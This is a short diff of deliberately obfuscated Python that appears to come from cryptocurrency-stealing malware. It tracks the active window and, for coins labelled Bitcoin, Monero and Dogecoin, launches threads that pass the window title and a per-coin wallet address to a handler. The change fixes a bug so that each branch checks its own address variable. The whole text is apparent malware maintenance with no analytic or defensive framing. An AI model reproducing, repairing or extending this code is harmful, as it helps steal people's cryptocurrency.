@@ -179,7 +179,7 @@ def vdsu281cjm():
 
     greduhio.sleep(0.25)
     if wadyhe_cery11 == True:
-        if hrextr_R2Xoy3 == 'None':
+        if hrextr_R2Xoy1 == 'None':
             pass
         else:
             frewsuih = yxvcre.getActiveWindow()
@@ -200,7 +200,7 @@ def vdsu281cjm():
                     wefuh4323.Thread(target=gesnui(frewsuih.title, 'Bitcoin [BTC]', hfruieoawd, hrextr_R2Xoy1)).start()
 
     elif wadyhe_cery22 == True:
-        if hrextr_R2Xoy3 == 'None':
+        if hrextr_R2Xoy2 == 'None':
             pass
         else:
             frewsuih = yxvcre.getActiveWindow()
@@ -243,7 +243,7 @@ def vdsu281cjm():
                     wefuh4323.Thread(target=gesnui(frewsuih.title, 'Monero [XMR]', hfruieoawd, hrextr_R2Xoy3)).start()
 
     elif wadyhe_cery44 == True:
-        if hrextr_R2Xoy3 == 'None':
+        if hrextr_R2Xoy4 == 'None':
             pass
         else:
             frewsuih = yxvcre.getActiveWindow()
@@ -262,7 +262,7 @@ def vdsu281cjm():
 
 
     elif wadyhe_cery55 == True or wadyhe_cery555 == True or wadyhe_cery5555 == True:
-        if hrextr_R2Xoy3 == 'None':
+        if hrextr_R2Xoy5 == 'None':
             pass
         else:
             frewsuih = yxvcre.getActiveWindow()
@@ -310,7 +310,7 @@ def vdsu281cjm():
                     if regh54 != 'None':
                         wefuh4323.Thread(target=gesnui(frewsuih.title, 'Dogecoin [DOGE]', hfruieoawd, hrextr_R2Xoy5)).start()
     elif wadyhe_cery66 == True:
-        if hrextr_R2Xoy3 == 'None':
+        if hrextr_R2Xoy6 == 'None':
             pass
         else:
             frewsuih = yxvcre.getActiveWindow()
